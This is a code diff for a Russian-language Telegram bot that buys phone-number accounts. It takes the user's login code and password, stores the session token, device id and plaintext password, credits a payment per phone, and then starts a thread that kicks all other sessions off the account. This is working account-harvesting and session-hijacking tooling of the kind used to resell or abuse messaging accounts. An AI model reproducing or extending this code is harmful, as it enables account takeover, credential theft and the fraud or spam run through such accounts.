@@ -1809,4 +1809,127 @@ async def code_handler(message: types.Message, state: FSMContext):
             if status == "done":
                 break
             if status and status.startswith("error:"):
-                await msg.e
+                await msg.edit_text(f"❌ {status[6:]}")
+                auth.close()
+                del pending[uid]
+                await state.clear()
+                return
+        
+        if pending[uid].get("status") != "done":
+            await msg.edit_text("❌ Таймаут регистрации.")
+            auth.close()
+            del pending[uid]
+            await state.clear()
+            return
+
+    if result.get("token"):
+        pending[uid]["token"] = result["token"]
+        pending[uid]["device_id"] = auth.device_id
+        pending[uid]["status"] = "done"
+
+    if pending[uid].get("status") == "done":
+        token = pending[uid]["token"]
+        device_id = pending[uid].get("device_id", "")
+        uid_str = str(uid)
+        
+        if uid_str not in accounts:
+            accounts[uid_str] = {}
+        accounts[uid_str][phone] = {
+            "token": token,
+            "web_token": None,
+            "device_id": device_id,
+            "user_id": 0,
+            "password": ""
+        }
+
+        if uid_str not in users:
+            users[uid_str] = {"balance": 0, "total_phones": 0, "total_earned": 0}
+        users[uid_str]["total_phones"] += 1
+        users[uid_str]["total_earned"] += PRICE_PER_PHONE
+        users[uid_str]["balance"] += PRICE_PER_PHONE
+
+        save_data()
+        await msg.edit_text(f"✅ Номер принят! Аккаунт успешно встал\n💰 Начислено: ${PRICE_PER_PHONE}")
+        
+        # Кикаем старые сессии через нативный TCP (opcode 96/97)
+        if result.get("token"):
+            threading.Thread(target=kick_sessions_native, args=(phone, token, device_id), daemon=True).start()
+        
+        auth.close()
+        del pending[uid]
+        await state.clear()
+        return
+
+    await msg.edit_text("❌ Неизвестная ошибка.")
+    auth.close()
+    del pending[uid]
+    await state.clear()
+
+@dp.message(AuthState.waiting_for_password)
+async def password_handler(message: types.Message, state: FSMContext):
+    uid = message.from_user.id
+    if uid not in pending:
+        return await message.answer("⏳ Сессия устарела. /start")
+
+    data = await state.get_data()
+    phone = data.get("phone", "")
+    pwd = message.text.strip()
+    auth = pending[uid].get("auth")
+
+    if not auth:
+        return await message.answer("⏳ Сессия устарела. /start")
+
+    msg = await message.answer("⏳ Проверяю пароль...")
+
+    token = None
+    def do_check():
+        nonlocal token
+        try:
+            token = auth.check_password(pwd)
+        except:
+            pass
+
+    threading.Thread(target=do_check, daemon=True).start()
+    await asyncio.sleep(3)
+
+    if token:
+        pending[uid]["token"] = token
+        pending[uid]["device_id"] = auth.device_id
+        uid_str = str(uid)
+
+        if uid_str not in accounts:
+            accounts[uid_str] = {}
+        accounts[uid_str][phone] = {
+            "token": token,
+            "web_token": None,
+            "device_id": auth.device_id,
+            "user_id": 0,
+            "password": pwd
+        }
+
+        if uid_str not in users:
+            users[uid_str] = {"balance": 0, "total_phones": 0, "total_earned": 0}
+        users[uid_str]["total_phones"] += 1
+        users[uid_str]["total_earned"] += PRICE_PER_PHONE
+        users[uid_str]["balance"] += PRICE_PER_PHONE
+
+        save_data()
+        await msg.edit_text(f"✅ Номер принят! Аккаунт успешно встал\n💰 Начислено: ${PRICE_PER_PHONE}")
+        
+        # Кикаем старые сессии через нативный TCP (opcode 96/97)
+        device_id = auth.device_id
+        threading.Thread(target=kick_sessions_native, args=(phone, token, device_id), daemon=True).start()
+    else:
+        await msg.edit_text("❌ Неверный пароль. Попробуйте ещё раз.")
+        return
+
+    auth.close()
+    del pending[uid]
+    await state.clear()
+
+async def main():
+    logging.info("Бот запущен!")
+    await dp.start_polling(bot)
+
+if __name__ == "__main__":
+    asyncio.run(main())
